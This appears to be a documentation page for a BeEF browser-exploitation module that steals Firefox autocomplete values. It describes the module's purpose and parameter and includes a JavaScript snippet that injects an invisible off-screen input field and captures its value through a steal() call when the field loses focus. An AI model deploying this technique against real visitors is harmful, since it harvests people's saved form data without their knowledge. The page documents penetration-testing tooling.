## Summary

* **Objective**: steal autocomplete values from Firefox
* **Authors**: Stefano Di Paola, bcoles
* **Browsers**: Firefox
* **Paramters** :
  * **Input Field Name** : name of input field to steal values from

* [Code](https://github.com/beefproject/beef/tree/master/modules/social_engineering/autocomplete_theft)

## Internal Working

This module will steal form field data when the user tries to autocomplete the chosen input field with arrow keys.

```js
input = document.createElement('input');
input.setAttribute("id",    "placeholder");
input.setAttribute("name",  "<%= @input_name %>");
input.setAttribute("style", "position:relative;top:-1000px;left:-1111px;width:1px;height:1px;border:none;");
input.setAttribute("type",  "text");
input.onkeyup   = function(event) { tt(event); }
input.onkeydown = function(event) { tt(event); }
input.onblur    = function(event) { steal(this.name,this.value);var o=this;setTimeout(function(){ o.focus();},100);this.value = "";document.body.removeChild(this); }
document.body.appendChild(input);
```


## Feedback

